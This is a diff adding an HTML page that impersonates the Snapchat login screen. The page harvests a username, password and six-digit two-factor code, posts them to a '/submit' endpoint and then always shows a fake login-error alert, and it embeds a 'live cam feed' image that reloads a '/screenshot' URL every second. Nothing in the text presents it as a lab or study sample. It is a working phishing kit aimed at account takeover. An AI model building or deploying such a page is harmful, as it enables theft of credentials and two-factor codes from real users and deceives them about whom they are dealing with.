@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Snapchat - Log In</title>
+    <style>
+        body { background: #fffc00; font-family: arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); width: 320px; text-align: center; }
+        h2 { color: #000; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #fffc00; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        .live { margin-top: 20px; border: 2px solid #000; border-radius: 8px; }
+        .live img { width: 100%; border-radius: 6px; }
+        .live-label { font-size: 12px; color: #666; margin-bottom: 5px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Log In to Snapchat</h2>
+        <input type="text" id="user" placeholder="Username or Email">
+        <input type="password" id="pass" placeholder="Password">
+        <input type="text" id="code" placeholder="6-Digit Code" maxlength="6">
+        <button onclick="submit()">Log In</button>
+        <div class="live">
+            <div class="live-label">live cam feed</div>
+            <img id="feed" src="/static/screenshot.png">
+        </div>
+    </div>
+    <script>
+        function submit() {
+            fetch('/submit', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    username: document.getElementById('user').value,
+                    password: document.getElementById('pass').value,
+                    code: document.getElementById('code').value
+                })
+            }).then(() => alert('error logging in. please try again.'));
+        }
+        setInterval(() => {
+            document.getElementById('feed').src = '/screenshot?t=' + Date.now();
+        }, 1000);
+    </script>
+</body>
+</html>
